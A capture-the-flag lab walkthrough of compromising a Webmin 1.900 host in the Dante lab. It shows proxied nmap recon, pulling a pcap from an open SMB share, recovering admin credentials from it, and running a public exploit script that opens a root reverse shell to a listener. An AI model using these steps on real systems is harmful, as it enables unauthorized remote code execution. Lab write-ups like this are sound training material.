# Reconnaissances 
## 172.16.1.17
```
proxychains nmap 172.16.1.17 -sT -sV -Pn -T5
```
```
Nmap scan report for 172.16.1.17
Host is up (0.22s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.41
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.900 (Webmin httpd)
Service Info: Host: 127.0.0.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 284.78 seconds
```

### Observe the HTTP
```
proxychains firefox http://172.16.1.17/
proxychains wget 172.16.1.17/webmin-1.900.zip
proxychains curl http://172.16.1.17/webmin/
proxychains firefox 172.16.1.17:10000
```

### Observe the Samba
```
proxychains smbclient -L \\172.16.1.17
```
```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.17:445  ...  OK
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        forensics       Disk      
        IPC$            IPC       IPC Service (DANTE-NIX03 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.17:139  ...  OK
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 172.16.1.17 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```
```
proxychains smbclient \\\\172.16.1.17\\forensics
```
```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Password for [WORKGROUP\kali]:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.17:445  ...  OK
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar  2 07:34:55 2024
  ..                                  D        0  Wed Jun 10 07:29:28 2020
  monitor                             N   153489  Thu Jun 25 17:01:07 2020

                13865000 blocks of size 1024. 5809936 blocks available
smb: \> get monitor
getting file \monitor of size 153489 as monitor (101.7 KiloBytes/sec) (average 101.7 KiloBytes/sec)
smb: \> 
```
```
$ file monitor                                                                         
monitor: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

### Observe the Pcap
```
$ wireshark monitor

```

Right-click on the HTTP POST request packet and click:

	"Follow" => "HTTP Stream".
	
```
POST /session_login.cgi HTTP/1.1
Host: 172.16.88.154:10000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.88.154:10000/session_login.cgi?logout=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://172.16.88.154:10000
DNT: 1
Connection: keep-alive
Cookie: redirect=1; testing=1; sid=x
Upgrade-Insecure-Requests: 1

user=admin&pass=password6543HTTP/1.0 200 Document follows
Date: Thu, 25 Jun 2020 21:00:47 GMT
Server: MiniServ/1.900
Connection: close
Auth-type: auth-required=1
Set-Cookie: redirect=1; path=/
Set-Cookie: testing=1; path=/
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; frame-src 'self'; child-src 'self'
Content-type: text/html; Charset=UTF-8
```

Try the credential to access 172.16.1.17:10000
```
proxychains firefox http://172.16.1.17:10000/  
```
`admin:password6543` it's not work.

observe other from `monitor pcap`
```
GET / HTTP/1.1
Host: 172.16.88.154:10000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.88.154:10000/session_login.cgi
DNT: 1
Connection: keep-alive
Cookie: redirect=1; testing=1; sid=2d35cb72e843b8ef6d0272407b427f20
Upgrade-Insecure-Requests: 1

HTTP/1.0 200 Document follows
Date: Thu, 25 Jun 2020 21:01:01 GMT
Server: MiniServ/1.900
Connection: close
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval'; frame-src 'self'; child-src 'self'
Content-type: text/html; Charset=UTF-8

<!DOCTYPE html>
<html data-host="172.16.88.154:10000" data-hostname="ubuntu" data-title-initial="Webmin 1.900 on ubuntu (Ubuntu Linux 20.04)" data-debug="0" data-session="1" data-script-name="/" data-background-style="gainsboro" data-night-mode="0" data-high-contrast="0" data-navigation-collapsed="0" data-slider-fixed="0" data-sestatus="0" data-shell="1" data-webmin="1" data-usermin="" data-navigation="1" data-status="1" data-package-updates="1" data-csf="0" data-theme="white" data-default-theme="white" data-theme-version="19.21" data-theme-mversion="01"  data-level="0" data-user-home="" data-user-id="" data-user="admin" data-dashboard="1" data-ltr="1" data-language="en" data-language-full="en" data-charset="UTF-8" data-notice="0" data-redirect="" data-initial-wizard="1" data-webprefix="" data-current-product="webmin" data-module="" data-uri="/" data-progress="1" data-product="webmin" data-access-level="0">
```
seem like it use `Webmin 1.900`

#### Pre-exploitation
```
$ searchsploit "webmin 1.900"
```
```
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                      | cgi/remote/46201.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                             | linux/webapps/47330.rb
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Other exploit source
```
https://github.com/roughiz/Webmin-1.910-Exploit-Script
```
```
$ wget https://raw.githubusercontent.com/roughiz/Webmin-1.910-Exploit-Script/master/webmin_exploit.py
```

#### Exploit
```
$ nc -lvnp 9001
```
```
$ proxychains python webmin_exploit.py  --rhost 172.16.1.17 --lhost 10.10.14.2 --lport 9001 -u admin -p Password6543

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
****************************** Webmin 1.910 Exploit By roughiz*******************************
*********************************************************************************************
*********************************************************************************************
*********************************************************************************************
****************************** Retrieve Cookies sid *****************************************
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.17:10000  ...  OK


********** [+] [Exploit] The Cookie is 864c388bfc6a9ba7aa7e0d193a541d05

********************************************************************************************
****************************** Create payload and Exploit ***********************************


[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.17:10000  ...  OK


********** [+] [Exploit] Verify you nc listener on port 9001 for the incomming reverse shell
```

On Listening port
```
listening on [any] 9001 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.110.3] 22033
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@DANTE-NIX03:/var/www/html/webmin/package-updates/# cat /root/flag.txt
cat /root/flag.txt
DANTE{SH4RKS_4R3_3V3RYWHERE}
root@DANTE-NIX03:/var/www/html/webmin/package-updates/# 
```
